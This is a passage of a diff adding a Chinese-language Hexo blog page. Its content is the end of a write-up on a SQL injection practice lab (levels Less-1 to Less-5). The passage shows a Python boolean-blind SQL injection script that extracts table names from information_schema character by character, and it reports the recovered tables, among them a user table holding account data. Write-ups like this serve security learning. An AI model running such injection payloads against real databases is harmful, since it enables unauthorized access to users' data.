limit "</span>+str(i)+<span class="string">",1)="</span>+str(j)+<span class="string">"%23"</span></span><br><span class="line">		<span class="comment">#print payload</span></span><br><span class="line">		recv=get_data(payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">			<span class="comment">#print j</span></span><br><span class="line">			<span class="keyword">return</span> j</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_TableName</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">		result=<span class="string">""</span></span><br><span class="line">		table_length=get_table_length(i)</span><br><span class="line">		<span class="keyword">if</span> table_length <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="comment">#print table_length</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> range(table_length):</span><br><span class="line">			<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">48</span>,<span class="number">122</span>):</span><br><span class="line">				payload=<span class="string">"and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(j)+<span class="string">",1))="</span>+str(k)+<span class="string">"%23"</span></span><br><span class="line">				recv=get_data(payload)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</span><br><span class="line">					result+=chr(k)</span><br><span class="line">					<span class="keyword">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	get_TableName()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2018/02/18/5a898f172d993.jpg" alt=""><br>现在获取到表名：email,referer,uagent,user，所以毫无疑问，需要的用户名以及账号信息都在user表里面，所以下一步需要开始查列。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Web/" rel="tag"># CTF_Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/16/XXE漏洞学习分析/" rel="next" title="XXE漏洞学习分析">
+                <i class="fa fa-chevron-left"></i> XXE漏洞学习分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2018/02/16/5a869aefaa2e6.png"
+                alt="Willard" />
+            
+              <p class="site-author-name" itemprop="name">Willard</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-number">1.</span> <span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-number">2.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-number">3.</span> <span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-number">4.</span> <span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5"><span class="nav-number">5.</span> <span class="nav-text">Less-5</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Willard</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+本站总访问量 <span id="busuanzi_value_site_pv"></span> &nbsp&nbsp&nbsp
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
